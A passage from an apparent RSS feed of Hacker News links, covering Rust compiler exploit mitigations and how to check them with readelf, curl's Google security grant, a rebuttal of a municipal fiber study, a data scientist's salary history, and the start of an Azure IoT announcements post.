<p>Integer overflow checks protects programs from undefined and unintended
behavior (which may cause vulnerabilities) by checking for results of signed
and unsigned integer computations that cannot be represented in their type,
resulting in an overflow or wraparound.</p>

<p>The Rust compiler supports integer overflow checks, and enables it when
debug assertions are enabled since version 1.0.0 (2015-05-15)[14]‚Äì[17], but
support for it was not completed until version 1.1.0 (2015-06-25)[16]. An
option to control integer overflow checks was later stabilized in version
1.17.0 (2017-04-27)[18]‚Äì[20].</p>

<div><div><pre><code><span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>u</span><span>:</span> <span>u8</span> <span>=</span> <span>255</span><span>;</span>
    <span>println!</span><span>(</span><span>"u: {}"</span><span>,</span> <span>u</span> <span>+</span> <span>1</span><span>);</span>
<span>}</span>
</code></pre></div></div>
<p>Fig. 2.‚ÄÉhello-rust-integer program.</p>

<div><div><pre><code>$ cargo run
   Compiling hello-rust-integer v0.1.0 (/home/rcvalle/hello-rust-integer)
    Finished dev [unoptimized + debuginfo] target(s) in 0.23s
     Running `target/debug/hello-rust-integer`
thread 'main' panicked at 'attempt to add with overflow', src/main.rs:3:23
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace.
</code></pre></div></div>
<p>Fig. 3.‚ÄÉBuild and execution of hello-rust-integer with debug assertions
enabled.</p>

<div><div><pre><code>$ cargo run --release
   Compiling hello-rust-integer v0.1.0 (/home/rcvalle/hello-rust-integer)
    Finished release [optimized] target(s) in 0.23s
     Running `target/release/hello-rust-integer`
u: 0
</code></pre></div></div>
<p>Fig. 4.‚ÄÉBuild and execution of hello-rust-integer with debug assertions
disabled.</p>

<p>Integer overflow checks are enabled when debug assertions are enabled (see
Fig. 3), and disabled when debug assertions are disabled (see Fig. 4). To
enable integer overflow checks independently, use the option to control
integer overflow checks, scoped attributes, or explicit checking methods
such as <code>checked_add</code><sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup>.</p>

<p>It is recommended that explicit wrapping methods such as <code>wrapping_add</code> be
used when wrapping semantics are intended, and that explicit checking and
wrapping methods always be used when using Unsafe Rust.</p>

<p id="fn:2">2. See <a href="https://doc.rust-lang.org/std/primitive.u32.html">https://doc.rust-lang.org/std/primitive.u32.html</a> for more
information on the checked, overflowing, saturating, and wrapping methods
(using u32 as an example). <a href="#fnref:2" role="doc-backlink">‚Ü©</a></p>

<h3 id="non-executable-memory-regions">Non-executable memory regions</h3>

<p>Non-executable memory regions increase the difficulty of exploitation by
limiting the memory regions that can be used to execute arbitrary code. Most
modern processors provide support for the operating system to mark memory
regions as non executable, but it was previously emulated by software, such
as in grsecurity/PaX
<a href="https://pax.grsecurity.net/docs/pageexec.txt">PAGEEXEC</a> and
<a href="https://pax.grsecurity.net/docs/segmexec.txt">SEGMEXEC</a>, on processors that
did not provide support for it. This is also known as ‚ÄúNo Execute (NX) Bit‚Äù,
‚ÄúExecute Disable (XD) Bit‚Äù, ‚ÄúExecute Never (XN) Bit‚Äù, and others.</p>

<p>The Rust compiler supports non-executable memory regions, and enables it by
default since its initial release, version 0.1 (2012-01-20)[21], [22], but
has regressed since then[23]‚Äì[25], and enforced by default since version
1.8.0 (2016-04-14)[25].</p>

<div><div><pre><code>$ readelf -l target/release/hello-rust | grep -A 1 GNU_STACK
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
</code></pre></div></div>
<p>Fig. 5.‚ÄÉChecking if non-executable memory regions are enabled for a given
binary.</p>

<p>The presence of an element of type <code>PT_GNU_STACK</code> in the program header
table with the <code>PF_X</code> (i.e., executable) flag unset indicates non-executable
memory regions<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup> are enabled for a given binary (see Fig. 5).
Conversely, the presence of an element of type <code>PT_GNU_STACK</code> in the program
header table with the <code>PF_X</code> flag set or the absence of an element of type
<code>PT_GNU_STACK</code> in the program header table indicates non-executable memory
regions are not enabled for a given binary.</p>

<p id="fn:3">3. See the Appendix section for more information on why it affects other
memory regions besides the stack. <a href="#fnref:3" role="doc-backlink">‚Ü©</a></p>

<h3 id="stack-clashing-protection">Stack clashing protection</h3>

<p>Stack clashing protection protects the stack from overlapping with another
memory region‚Äîallowing arbitrary data in both to be overwritten using each
other‚Äîby reading from the stack pages as the stack grows to cause a page
fault when attempting to read from the guard page/region. This is also
referred to as ‚Äústack probes‚Äù or ‚Äústack probing‚Äù.</p>

<p>The Rust compiler supports stack clashing protection via stack probing, and
enables it by default since version 1.20.0 (2017-08-31)[26]‚Äì[29].</p>

<p><img src="https://rcvalle.blog/assets/2020/09/16/rust-lang-exploit-mitigations/image1.png" alt="Screenshot listing cross references to __rust_probestack in hello-rust." title="Cross references to __rust_probestack in hello-rust.">
Fig. 6. Cross references to <code>__rust_probestack</code> in hello-rust.</p>

<div><div><pre><code><span>fn</span> <span>hello</span><span>()</span> <span>{</span>
    <span>println!</span><span>(</span><span>"Hello, world!"</span><span>);</span>
<span>}</span>

<span>fn</span> <span>main</span><span>()</span> <span>{</span>
    <span>let</span> <span>_</span><span>:</span> <span>[</span><span>u64</span><span>;</span> <span>1024</span><span>]</span> <span>=</span> <span>[</span><span>0</span><span>;</span> <span>1024</span><span>];</span>
    <span>hello</span><span>();</span>
<span>}</span>
</code></pre></div></div>
<p>Fig 7. Modified hello-rust.</p>

<p><img src="https://rcvalle.blog/assets/2020/09/16/rust-lang-exploit-mitigations/image2.png" alt="Screenshot listing cross references to __rust_probestack in modified hello-rust." title="Cross references to __rust_probestack in modified hello-rust.">
Fig. 8. Cross references to <code>__rust_probestack</code> in modified hello-rust.</p>

<p>To check if stack clashing protection is enabled for a given binary, search
for cross references to <code>__rust_probestack</code>. The <code>__rust_probestack</code> is
called in the prologue of functions whose stack size is larger than a page
size (see Fig. 6), and can be forced for illustration purposes by modifying
the hello-rust example as seen in Fig. 7 and Fig. 8.</p>

<h3 id="read-only-relocations-and-immediate-binding">Read-only relocations and immediate binding</h3>

<p><strong>Read-only relocations</strong> protect segments containing relocations and
relocation information (i.e., <code>.init_array</code>, <code>.fini_array</code>, <code>.dynamic</code>, and
<code>.got</code>) from being overwritten by marking these segments read only. This is
also referred to as ‚Äúpartial RELRO‚Äù.</p>

<p>The Rust compiler supports read-only relocations, and enables it by default
since version 1.21.0 (2017-10-12)[30], [31].</p>

<div><div><pre><code>$ readelf -l target/release/hello-rust | grep GNU_RELRO
  GNU_RELRO      0x000000000002ee00 0x000000000002fe00 0x000000000002fe00
</code></pre></div></div>
<p>Fig. 9.‚ÄÉChecking if read-only relocations is enabled for a given binary.</p>

<p>The presence of an element of type <code>PT_GNU_RELRO</code> in the program header
table indicates read-only relocations are enabled for a given binary (see
Fig. 9). Conversely, the absence of an element of type <code>PT_GNU_RELRO</code> in the
program header table indicates read-only relocations are not enabled for a
given binary.</p>

<p><strong>Immediate binding</strong> protects additional segments containing relocations
(i.e., <code>.got.plt</code>) from being overwritten by instructing the dynamic linker
to perform all relocations before transferring control to the program during
startup so all segments containing relocations can be marked read only (when
combined with read-only ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/">https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/</a></em></p>]]>
            </description>
            <link>https://rcvalle.blog/2020/09/16/rust-lang-exploit-mitigations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575844</guid>
            <pubDate>Thu, 24 Sep 2020 06:25:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Google Grant for Libcurl Work]]>
            </title>
            <description>
<![CDATA[
Score 25 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24575819">thread link</a>) | @gilad
<br/>
September 23, 2020 | https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/ | <a href="https://web.archive.org/web/*/https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Earlier this year I was the recipient of a monetary <a rel="noreferrer noopener" href="https://www.google.com/about/appsecurity/patch-rewards/" target="_blank">Google patch grant</a> with the expressed purpose of <strong>improving security in libcurl</strong>.</p>



<p>This was an upfront payout under this Google program describing itself as ‚Äúan experimental program that rewards proactive security improvements to select open-source projects‚Äù.</p>



<p>I accepted this grant for the curl project and <strong>I intend to keep working fiercely on securing curl</strong>. I recognize the importance of curl security as curl remains one of the most widely used software components in the world, and even one that is doing network data transfers which typically is a risky business. curl is responsible for a <a href="https://daniel.haxx.se/blog/2019/12/04/daily-web-traffic/">measurable share</a> of all Internet transfers done over the Internet an average day. My job is to make sure those transfers are done as safe and secure as possible. It isn‚Äôt my <em>only</em> responsibility of course, as I have other tasks to attend to as well, but still.</p>



<h2>Do more</h2>



<p>Security is already and always a top priority in the curl project and for myself personally. This grant will of course further my efforts to strengthen curl and by association, all the many users of it.</p>



<h2>What I will not do</h2>



<p>When security comes up in relation to curl, some people like to mention and propagate for other programming languages, But <strong>curl will not be rewritten in another language</strong>. Instead we will increase our efforts in writing good C and detecting problems in our code earlier and better.</p>



<h2>Proactive counter-measures</h2>



<p>Things we have done lately and working on to enforce everywhere:</p>



<p><strong>String and buffer size limits</strong> ‚Äì all string inputs and all buffers in libcurl that are allowed to grow now have a maximum allowed size, that makes sense. This stops malicious uses that could make things grow out of control and it helps detecting programming mistakes that would lead to the same problems. Also, by making sure strings and buffers are never ridiculously large, we avoid a whole class of integer overflow risks better.</p>



<p><strong>Unified dynamic buffer functions</strong> ‚Äì by reducing the number of different implementations that handle ‚Äúgrowing buffers‚Äù we reduce the risk of a bug in one of them, even if it is used rarely or the spot is hard to reach with and ‚Äúexercise‚Äù by the fuzzers. The ‚Äúdynbuf‚Äù internal API first shipped in curl 7.71.0 (June 2020).</p>



<p><strong>Realloc buffer growth unification</strong> ‚Äì pretty much the same point as the previous, but we have earlier in our history had several issues when we had silly realloc() treatment that could lead to bad things. By limiting string sizes and unifying the buffer functions, we have reduced the number of places we use realloc and thus we reduce the number of places risking new realloc mistakes. The realloc mistakes were usually in combination with integer overflows.</p>



<p><strong>Code style</strong> ‚Äì we‚Äôve gradually improved our code style checker (<code>checksrc.pl</code>) over time and we‚Äôve also gradually made our code style more strict, leading to less variations in code, in white spacing and in naming. I‚Äôm a firm believer this makes the code look more coherent and therefore become more readable which leads to fewer bugs and easier to debug code. It also makes it easier to grep and search for code as you have fewer variations to scan for.</p>



<p><strong>More code analyzers</strong> ‚Äì we run every commit and PR through a large number of code analyzers to help us catch mistakes early, and we always remove detected problems. Analyzers used at the time of this writing: lgtm.com, Codacy, Deepcode AI, Monocle AI, clang tidy, scan-build, CodeQL, Muse and Coverity. That‚Äôs of course in addition to the regular run-time tools such as valgrind and sanitizer builds that run the entire test suite.</p>



<p><strong>Memory-safe components</strong> ‚Äì curl already supports getting built with a plethora of different libraries and ‚Äúbackends‚Äù to cater for users‚Äô needs and desires. By properly supporting and offering users to build with components that are written in for example rust ‚Äì or other languages that help developers avoid pitfalls ‚Äì future curl and libcurl builds could potentially avoid a whole section of risks. (Stay tuned for more on this topic in a near future.)</p>



<h2>Reactive measures</h2>



<p>Recognizing that whatever we do and however tight ship we run, <strong>we will continue to slip every once in a while</strong>, is important and we should make sure we find and fix such slip-ups as good and early as possible.</p>



<p><strong>Raising bounty rewards</strong>. While not directly fixing things, offering more money in <a href="https://hackerone.com/curl">our bug-bounty program</a> helps us get more attention from security researchers. Our ambition is to gently drive up the reward amounts progressively to perhaps multi-thousand dollars per flaw, as long as we have funds to pay for them and we mange keep the security vulnerabilities at a reasonably low frequency.</p>



<p><strong>More fuzzing</strong>. I‚Äôve said it before but let me say it again: fuzzing is really the top method to find problems in curl once we‚Äôve fixed all flaws that the static analyzers we use have pointed out.  The primary fuzzing for curl is done by OSS-Fuzz, that tirelessly keeps hammering on the most recent curl code.</p>



<p>Good fuzzing needs a certain degree of ‚Äúhand-holding‚Äù to allow it to really test all the APIs and dig into the dustiest corners, and we should work on adding more ‚Äúprobes‚Äù and entry-points into libcurl for the fuzzer to make it exercise more code paths to potentially detect more mistakes.</p>



<p>See also my presentation <a href="https://daniel.haxx.se/blog/2020/07/02/video-testing-curl-for-security/">testing curl for security</a>.</p>
	</div></div>]]>
            </description>
            <link>https://daniel.haxx.se/blog/2020/09/23/a-google-grant-for-libcurl-work/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575819</guid>
            <pubDate>Thu, 24 Sep 2020 06:20:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Updated Analysis of UPenn 'Muncipal Fiber in the U.S.' Study]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24575516">thread link</a>) | @onionjake
<br/>
September 23, 2020 | https://www.yeskaysvillefiber.com/blog/upenn-study | <a href="https://web.archive.org/web/*/https://www.yeskaysvillefiber.com/blog/upenn-study">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-7b877f25b8cd4b330ade"><div><blockquote><p>Opponents of Kaysville Fiber keep referring to a UPenn study to state that the project is highly likely to fail financially. Is this true?</p></blockquote><p>No. Using the UPenn study as a tool to evaluate Kaysville Fiber‚Äôs long term success ignores the limitations of the study that the authors themselves expressly point out. When looking at the study in context of its actual methods and limitations, it is clear that it has little to no predictive value on which to judge Kaysville Fiber.</p><h4>Limitation of the UPenn Study</h4><p>The study reviewed 20 projects out of 330 currently in operation nationwide (a sample size of 6%), and only 5 years of cash flows for those projects. As the authors themselves caution in the study, it was extremely limited to data for just a small amount of projects over a narrow window of time.</p><p>Municipal fiber infrastructure is a very long term investment and cities generally plan to recoup their cost of infrastructure over 20 to 30 years. Financing and customer rates are generally designed to line up with this type of time period. So if you were to look at the overall cash flow related to the project, you would see a large outlay of cash while the project is constructed, and then you would see the steady recuperation of that cost over 20 to 30 years.</p><p>This creates a large problem when you are limited in scope to only 5 years, as is the case for the UPenn study. The study takes a five year period for 20 projects, which include large amounts of capital investment in the network infrastructure (which it treats as ongoing operating cash flow), and then calculates how long it would take to payback the full project cost using that 5 year window as the assumed cash flow going forward.&nbsp; The results of this limited scope analysis shows that 18 of the 20 projects would not be self sustaining.&nbsp;These results are not surprising given the methods described. Most infrastructure heavy endeavors across industries would show similar results.</p><h4>Updating the Data</h4><p>Since the study only looks at financial performance through 2014, we decided to see what has happened since. The result? In just five more years, a substantial amount of projects that UPenn suggested would indefinitely struggle have now paid back or are on track to payback ahead of schedule. Just four of the original 18 projects that UPenn concluded were unsustainable remain so. We suspect that with more time (per typical project design with long term assets) these projects will also improve. Here are some examples of how inaccurate the UPenn results turned out. For each of these projects, UPenn suggested it would take centuries to payback (if ever):</p><ul data-rte-list="default"><li><p>Chattanooga generated $377M on their $162M project in 10 years. </p></li><li><p>Wilson and Pulaski are five years from paying off&nbsp;debt. </p></li><li><p>Clarksville is two years from paying off debt. </p></li></ul><p>The bottom line, the study is not useful to predict success of municipal fiber projects. The study does show that if you expect to payoff your debt over a 5 year period of time, that is likely not going to happen (though half of the projects surprisingly did show positive cash flow in their five year windows).</p><p>The full results are shown at the end of this post.</p><p>Needless to say, this study is outdated and has not aged well. The authors have indicated that they would update their analysis as more information becomes available. With several more years of audited financial reports released, they have yet to provide an update.</p><p>As residents evaluate whether Kaysville should pursue its fiber project or not, it is important that we use relevant and reliable information. This particular study falls short.</p><p>Summary Results below. Full spreadsheet can be downloaded at <a href="https://www.yeskaysvillefiber.com/s/Penn-Law-Study-Update-Spreadsheet.xlsx" target="_blank">here</a>.</p></div></div></div>]]>
            </description>
            <link>https://www.yeskaysvillefiber.com/blog/upenn-study</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575516</guid>
            <pubDate>Thu, 24 Sep 2020 05:26:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Intel-Owned Mobileye to Operate Dubai Robotaxis (Middle East AI News)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24575167">thread link</a>) | @asiaainews
<br/>
September 23, 2020 | https://www.getrevue.co/profile/middleeastainews/issues/mobileye-to-power-uae-robotaxis-egypt-s-elves-raises-2-million-278802 | <a href="https://web.archive.org/web/*/https://www.getrevue.co/profile/middleeastainews/issues/mobileye-to-power-uae-robotaxis-egypt-s-elves-raises-2-million-278802">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.getrevue.co/profile/middleeastainews/issues/mobileye-to-power-uae-robotaxis-egypt-s-elves-raises-2-million-278802</link>
            <guid isPermaLink="false">hacker-news-small-sites-24575167</guid>
            <pubDate>Thu, 24 Sep 2020 04:11:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How much I made as a data scientist]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574928">thread link</a>) | @data4lyfe
<br/>
September 23, 2020 | https://www.interviewquery.com/blog-data-science-salaries/ | <a href="https://web.archive.org/web/*/https://www.interviewquery.com/blog-data-science-salaries/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://www.interviewquery.com/content/images/size/w300/2020/09/software-developer-3182374_1280.jpg 300w,
                            https://www.interviewquery.com/content/images/size/w600/2020/09/software-developer-3182374_1280.jpg 600w,
                            https://www.interviewquery.com/content/images/size/w1000/2020/09/software-developer-3182374_1280.jpg 1000w,
                            https://www.interviewquery.com/content/images/size/w2000/2020/09/software-developer-3182374_1280.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://www.interviewquery.com/content/images/size/w2000/2020/09/software-developer-3182374_1280.jpg" alt="How Much Do Data Scientists Make? (My Journey)">
            </figure>

            <section>
                <div>
                    <!--kg-card-begin: html--><!--kg-card-end: html--><p>Today, we‚Äôre talking about data science salaries. </p><p>Obviously, this is a huge‚Äì and typically taboo‚Äì question to ask just anyone, so in the spirit of full transparency, I‚Äôll be telling you how much I‚Äôve made in all of my data science positions ever since I‚Äôve graduated. <br></p><p>First of all, let‚Äôs cover some basics. Your pay will <em>very much </em>depend on the company you‚Äôre working for, with respect to their size, how much funding they‚Äôre willing to allocate to you, and lots of other factors. And it also depends on you‚Äì your experiences, your career progression, and how much money really matters to you (pertaining to the position you apply for). </p><p>For context on the figures I‚Äôm about to introduce, let‚Äôs take a look at some industry statistics. Today, Glassdoor lists the mean annual data science salary to be $112,000. Indeed has an average salary of $120,000, while PayScale comes in a bit lower with $95,000. </p><p>On the other end of the scale, <a href="https://www.levels.fyi/comp.html?track=Data%20Scientist">levels.fyi </a>has a data science salary median of $150,000, and an insane $238,000 median coming from those in the San Francisco Bay Area. Out of curiosity‚Äìand sheer disbelief‚Äì I tried submitting a fake salary of $400k, and they still accepted it, so who knows? </p><h2 id="first-data-science-salary-offer-out-of-college">First Data Science Salary Offer Out of College</h2><p>After graduating college in 2015, I had two different job offers waiting for me. </p><p>The first was from a company called Workday, and they offered me a <strong>$95,000 base salary and $60,000 over four years in terms of stock</strong>. For total compensation, this equals out to about $110,000 annually. The position they needed to fill was actually for a Software Engineer in Performance, which is ultimately‚Äìspoiler alert‚Äì why I didn‚Äôt end up taking the job. </p><p>The second offer came from Inflection, and they were looking for a marketing analyst, extending <strong>a base salary of $85,000 with a $5000 sign-on bonus</strong>. </p><p>So why did I end up taking a $25,000 pay-cut in accepting one offer over the other? </p><p>Well, when I interviewed at Workday right out of college, they actually didn‚Äôt ask me any technical questions. The interview was very casual‚Äì we laughed and joked around, and mostly talked about projects I had worked on in the past.</p><p>Ultimately, while I was really happy with the offer (making six figures out of college was <em>insane </em>to me), I thought that the marketing analyst role would be more helpful for later transitioning to data science, and I was also a lot more excited to learn from my boss at Inflection. </p><p><em>If you're interested in how I landed my <a href="https://www.interviewquery.com/blog-new-grad-guide-on-landing-data-science-job/">first data science job out of college</a>, check out my new grad data science guide and my youtube video on l<a href="https://www.youtube.com/watch?v=7v_Szio9r3E">anding a data science job without experience</a>!</em></p><h2 id="first-data-scientist-position-salary">First Data Scientist Position Salary<br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/INF_logo_2015.png" alt="My data science salary at Inflection (pictured) was around $85,000/year. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/INF_logo_2015.png 600w, https://blog.interviewquery.com/content/images/2020/09/INF_logo_2015.png 610w"><figcaption>Image from <a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fduo.com%2Fuse-cases%2Fcase-studies%2Finflection&amp;psig=AOvVaw1lJKdBCQA_Cc3S8bCZ-dpS&amp;ust=1600470045417000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCOC53Nal8esCFQAAAAAdAAAAABAd"><em>Google Images</em></a></figcaption></figure><p>So as a new grad, I was making around $85k a year in the San Francisco Bay Area, which is definitely a really expensive place to live. My take-home pay after tax and everything was around $4000 a month, so, as you can imagine, I didn‚Äôt have a lot of savings left over. </p><p>Very quickly, I realized that this was the minimum amount I needed to survive. As someone new to the workforce that hasn‚Äôt seen that much money before, it can be a little distorting to see those big numbers and having it end up being much less in real-life, but I saw this as a good opportunity anyway for a new grad. <br></p><p>However, after working at Inflection for around three to four months, I started to feel like the company wasn‚Äôt really for me. I wasn‚Äôt learning a whole lot, and my boss ended up leaving in the first two weeks, so I decided to leave after a few months to seek out other opportunities.</p><p>At this point, I was kicking myself for not taking that position at Workday, but I ended up taking a new job with Jobr, which is actually where I found the position. They reached out to me with a data scientist position (specifically working with the recommendation algorithm), and eventually an offer came in for <strong>$80,000 with 0.5% equity, so my base pay would be cut by $5k</strong>. </p><p>Equity works based on the evaluation of the company at that time, which was around $10 million. Jobr raised $2 million with that evaluation, so my 0.5% cut of equity meant that I was entitled to around $50,000 over the course of four years, with the possibility of that value increasing. </p><p>Inside my employment contract, they had also included a clause that if they had raised the Series A, my base salary would go up to $100,000 once that Series A had gone through. </p><p>At this point, I kind of felt like I‚Äôd be stupid <em>not to take the job </em>because no one else was really interested in hiring me. </p><h2 id="startup-acquisition-how-much-did-i-make">Startup Acquisition: How Much Did I Make?<br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg" alt="After moving over to work for Jobr, my data science base salary increased from $80k to $110k." srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg 600w, https://blog.interviewquery.com/content/images/2020/09/8832841d-eaa7-46d7-bb9b-f2b02b54616f.jpeg 658w"><figcaption>Image from <a href="https://www.google.com/url?sa=i&amp;url=https%3A%2F%2Fwww.producthunt.com%2Fposts%2Fjobr&amp;psig=AOvVaw1BGKqJRJtQRFJl47LG6onm&amp;ust=1600470194602000&amp;source=images&amp;cd=vfe&amp;ved=0CAIQjRxqFwoTCKCW-J2m8esCFQAAAAAdAAAAABAY"><em>Google Images</em></a></figcaption></figure><p>So here‚Äôs where a bit of luck came into play. After six months of working at my job, Jobr was acquired for $12.5 million by Monster, who was looking at my company‚Äôs Tinder-for-jobs kind of app. Using that value, you‚Äôd think that I‚Äôd hit the jackpot with my share of equity at around $62,500. Unfortunately, no. </p><p>If you‚Äôre unfamiliar with acquisitions, basically when a larger company consumes a smaller one, there's a lot of lawyers, brokers, investors, and other middle-men involved. All in all, you can expect around a third of the amount you‚Äôre originally supposed to get to go to a bunch of different people, even if it‚Äôs above the evaluation the company raised (as it was in this case). </p><p>Pre-tax, I ended up taking home around $40,000, rounding up my first year with Jobr to be around $150,000. </p><p>To summarize, I guess the lesson here is that it‚Äôs important to continually develop your skills, as that‚Äôs what you‚Äôre being hired for. <strong>Money comes later (with a little bit of luck!), but it helps to set yourself up for success first in your current environment. </strong></p><p>So after acquisition, earnout was also given out. Basically, revenue targets are set for certain metrics, and if you hit those, you can end up earning more from the acquisition. With the way it was written out in my contract, I‚Äôd basically be able to receive another $40,000-$50,000 for every year after the acquisition.</p><p>We ended up forecasting that we‚Äôd hit around 90% of them, so my take-home ended up being around <strong>$150,000 annually</strong> after that first year. </p><p>In 2017, the whole company in Jobr negotiated a raise from the parent company, so I got bumped up to <strong>$130,000 base-pay, making my total compensation per year at that point to be $170,000. </strong></p><h2 id="my-last-data-science-salary-at-nextdoor">My Last Data Science Salary at Nextdoor <br></h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/media-logos-green.png" alt="My annual data science salary at Nextdoor decreased when I switched jobs again. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/media-logos-green.png 600w, https://blog.interviewquery.com/content/images/2020/09/media-logos-green.png 640w"></figure><p>In 2018, my third year out of college, I ended up switching jobs again. Everyone I had known originally at Jobr had left at this point, including my current co-founder Shane. The work culture had changed, and I really wanted to find another company that really fit and supported my needs. </p><p>I knew that my total compensation was likely to decrease unless I interviewed for larger companies, but my main focus at this point was finding a place that I really liked. </p><p>I signed up for Hired, and Nextdoor ended up reaching out to me after I set my base salary ($150,000) requirement. In hindsight, now that I‚Äôve learned a lot more about negotiation and interviewing, I don‚Äôt recommend using Hired. Once you set your salary at a certain threshold, companies will end up using that when they‚Äôre negotiating with you, <strong>setting up a salary expectation that‚Äôs lower than what they can actually allocate to you</strong>. </p><p>In this way, it‚Äôs better to withhold salary expectations until the end of the interviewing process, but I still consider Hired a good place to get a job if you don‚Äôt actually want to go out there and apply for X number of positions. </p><p>So with Nextdoor, I went through the entire process (including the on-site interview), so I was having good feelings about the company when I met everyone. My offer ended up around $145,000, which is lower than what I expected given what I put in my Hired profile. </p><p>This was a <em>huge </em>indication to me that their intentions were to start lower so we could negotiate up. In the end, I negotiated up to $155,000 with a $20,000 sign-on bonus, so <strong>my total compensation for that first year was $175,000</strong>. My offer included some equity as well, but this is much harder to calculate with a long-term unicorn like Nextdoor, as you don‚Äôt really know when they‚Äôre going to exit. </p><p>Currently, I'm at InterviewQuery, definitely making less than $175,000 a year. If I were to estimate given my career progression if I had taken another data science job, I probably could have secured around $190,000 in base salary, or maybe even more if it were at Facebook, Google, or Amazon, etc. </p><h2 id="data-science-salary-tips-tricks">Data Science Salary: Tips &amp; Tricks</h2><figure><img src="https://blog.interviewquery.com/content/images/2020/09/freelance-1989333_1280.png" alt="Data Science salaries change by a variety of factors. " srcset="https://blog.interviewquery.com/content/images/size/w600/2020/09/freelance-1989333_1280.png 600w, https://blog.interviewquery.com/content/images/size/w1000/2020/09/freelance-1989333_1280.png 1000w, https://blog.interviewquery.com/content/images/2020/09/freelance-1989333_1280.png 1280w" sizes="(min-width: 720px) 720px"><figcaption>Image from <em><a href="https://pixabay.com/vectors/freelance-work-job-making-money-1989333/">Pixabay</a></em></figcaption></figure><p>If you‚Äôre just about to be in the negotiation process or if you‚Äôre just looking to break in data science salary numbers, here‚Äôs some helpful rules that might change how you look at things. </p><h3 id="never-compare-yourself-to-others-">Never compare yourself to others. <br></h3><p>Honestly, this is just an unfair comparison overall. You would be doing yourself a disservice in trying to connect different data science salaries to other people who have different luck, experiences, and career trajectories. </p><h3 id="determine-your-own-market-value-">Determine your own market value. <br></h3><p>The general consensus is that you‚Äôre worth the amount for which you can be replaced by anyone else in the field. So, for instance, if you‚Äôre doing BI analysis as a data scientist, then you can essentially be replaced by a BI analyst at a lower salary. </p><p>In this way, it‚Äôs imperative to really understand what your role entails, as well as how you can grow, whether that involves becoming a manager, a technical lead, etc. </p><h3 id="figure-out-how-much-money-means-to-you-">Figure out how much money means to you. <br></h3><p>When I was walking in and out of work everyday, I didn‚Äôt feel like I was walking out of $100k, or $200k, or whatever that equivalent is per hour.</p><p>Understanding your goals (trying to retire or be financially independent versus being more focused on learning more) is incredibly important, as it dictates, ultimately, what kind of company you may end up working for, and as a result, the workplace environment and culture. </p><blockquote><em>If you're curious about the ‚Ä¶</em></blockquote></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.interviewquery.com/blog-data-science-salaries/">https://www.interviewquery.com/blog-data-science-salaries/</a></em></p>]]>
            </description>
            <link>https://www.interviewquery.com/blog-data-science-salaries/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24574928</guid>
            <pubDate>Thu, 24 Sep 2020 03:22:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Top Azure IoT Announcements and Sessions from Microsoft Ignite 2020]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24574797">thread link</a>) | @crpietschmann
<br/>
September 23, 2020 | https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/ | <a href="https://web.archive.org/web/*/https://build5nines.com/top-azure-iot-announcements-and-sessions-from-microsoft-ignite-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
<p>There have been a few great Azure IoT announcements and session made available by Microsoft as part of the Microsoft Ignite 2020 virtual conference. With the flood of information coming out of Microsoft Ignite 2020,  it can be difficult to parse out the specific announcements and sessions of interest, so here‚Äôs a list that‚Äôs focused solely on the topics of Azure IoT.</p>



<p>Let‚Äôs take a look at the top Azure IoT (Internet of Things) announcements from Microsoft Ignite 2020!</p>








<br><h2><span id="azure_iot_announcements"></span>Azure IoT Announcements<span></span></h2>



<br><h3><span id="azure_sql_edge,_optimized_for_iot_gateways_and_devices_now_ga"></span>Azure SQL Edge, Optimized for IoT Gateways and Devices now GA<span></span></h3>



